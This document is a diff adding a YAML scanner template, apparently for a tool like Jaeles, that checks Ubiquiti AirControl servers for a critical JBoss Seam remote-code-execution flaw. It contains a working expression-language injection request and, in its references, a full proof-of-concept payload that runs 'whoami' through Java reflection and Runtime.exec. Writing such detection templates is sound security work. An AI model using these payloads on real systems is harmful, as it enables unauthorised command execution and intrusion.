@@ -1,0 +1,29 @@
+id: aircontrol-rce
+info:
+  name: AirControl RCE
+  risk: Critical
+
+params:
+  - root: '{{.BaseURL}}'
+
+variables:
+  - endpoint: |
+      /.seam
+      /home.seam
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}{{.endpoint}}?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName(%27java.lang.Runtime%27).getDeclaredMethods()[7]}
+    headers:
+      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
+    detections:
+      - >-
+        StatusCode() == 302 && StringSearch("resHeader", "pwn.seam") && StringSearch("resHeader", "?pwned=")
+
+references:
+  - vendor: https://www.ui.com/download/utilities/default/default/aircontrol-20-user-guide
+  - author: 0xd0ff9 & j3ssie
+  - rce_poc: |
+      /.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.io.BufferedReader').getDeclaredMethod('readLine').invoke(''.getClass().forName('java.io.BufferedReader').getConstructor(''.getClass().forName('java.io.Reader')).newInstance(''.getClass().forName('java.io.InputStreamReader').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Process').getDeclaredMethod('getInputStream').invoke(''.getClass().forName('java.lang.Runtime').getDeclaredMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(null),'whoami')))))}
